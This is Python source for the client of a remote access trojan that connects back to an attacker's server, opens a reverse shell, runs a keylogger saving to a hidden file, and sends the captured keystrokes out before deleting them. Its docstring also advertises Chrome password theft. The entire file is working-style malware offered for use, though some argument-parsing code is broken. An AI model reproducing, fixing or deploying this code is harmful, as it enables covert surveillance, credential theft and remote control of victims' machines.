import os
import socket
import sys

from connection import Connection
from keylogger import KeyLogger
from rev_shell import Shell
from argparse import ArgumentParser


def get_input():
    parser = ArgumentParser()

    parser.add_argument(
        "--ip",
        type=str,
        required=True,
        description="IP of the server"
    )

    parser.add_argument(
        "--port", "-p",
        type=int,
        default=9001,
        required=False,
        description="Port of the server"
    )

    parser.parse_args()
    return parser


def receive_data(sock: socket) -> str:
    """
    Receives data through socket

    :param sock: The socket to use

    :returns: The received data
    """

    # Wait until data is received
    data = sock.recv(1024).decode("UTF-8")

    return data


def send_data(data: str, sock: socket) -> None:
    """
    Sends data through socket

    :param data: The data to send
    :param sock: The socket to use
    """
    sock.send(str.encode(data))


class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Gets passwords from Google Chrome
        - Logs key events to a file
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int = 9001, file_port: int = 9002,
                 keylog_filename: str = ".activity.txt") -> None:
        """
        Constructor

        required:
        :param host: The server's IP
        
        optional:
        :param port: The server's port number for main connection
        :param file_port: The port number used for the file transfer
        :param keylog_filename: The file's name where the keystrokes are stored
        """

        self.host = host
        self.port = port
        self.file_port = file_port
        self.keylog_filename = keylog_filename

        # Create client instance
        self.client = Connection(self.host, self.port)

        # Open socket connection back to server
        self.sock = self.client.connect()

        # Create shell instance
        self.shell = Shell(self.sock)

        # Initialize keylogger instance
        self.keylogger = KeyLogger(self.keylog_filename)

    def run(self) -> None:
        """
        Opens menu and performs features
        """

        while 1:

            try:
                # Opens menu
                choice = self.open_menu()

                if choice == 1:
                    self.shell.get_shell()

                elif choice == 2:
                    self.keylogger.start_log()
                    send_data("\n\nKey logging started to file '{}'...".format(self.keylog_filename), self.sock)

                elif choice == 3:
                    self.keylogger.end_log()
                    send_data("\n\nKey logging stopped...", self.sock)

                elif choice == 4:
                    self.send_file(self.keylog_filename)
                    send_data("\n\n{} sent and deleted from client...".format(self.keylog_filename), self.sock)

            # Connection error handling
            except (ConnectionResetError, ConnectionAbortedError, ConnectionError):
                self.sock.close()
                break

    def open_menu(self) -> int:
        """
        Opens the selection menu to the server
        
        :returns: The choice of the menu
        """

        # Opens menu
        menu_str = "\nPlease select one of the functionalities from the following menu: \n \n \
            1) Get a reverse shell \n \
            2) Start keylogger \n \
            3) Stop keylogger \n \
            4) Receive keylogger file \n\n \
            \n Choice: "

        send_data(menu_str, self.sock)

        # Receives messages from server
        response = receive_data(self.sock)

        # Try to convert to int
        try:
            response = int(response)
        except ValueError:
            pass

        # Check valid response
        if response not in [1, 2, 3, 4]:
            send_data("\nNot a valid response!\n", self.sock)
            self.open_menu()

        return response

    def send_file(self, filename: str) -> None:

        response = ""

        # Instructions
        send_data(f"\nTo receive file {filename}: \n \
        run command in another terminal:\n \
        nc -l -p {self.file_port} > {filename} \n", self.sock)

        # Wait for enter press
        while not response == "\n":
            send_data("Press enter to send file {}: ".format(filename), self.sock)
            response = receive_data(self.sock)

        # Create file client instance
        file_client = Connection(self.host, self.file_port)

        # Open socket connection for file transfer
        file_sock = file_client.connect()

        # Open and read file
        with open(filename, "r") as f:
            file_content = f.read()

        # Remove file from client
        os.remove(filename)

        # Send the file data to server
        send_data(file_content, file_sock)

        # Close connection when finished
        file_sock.close()


def main():
    args = get_input()
    client = Client(host=args.ip, port=args.port)
    while 1:
        try:
            client.run()
        except Exception as e:
            print(f"Error: {e}")



if __name__ == "__main__":
    # Run RAT with specified IP and port continuously
    main()
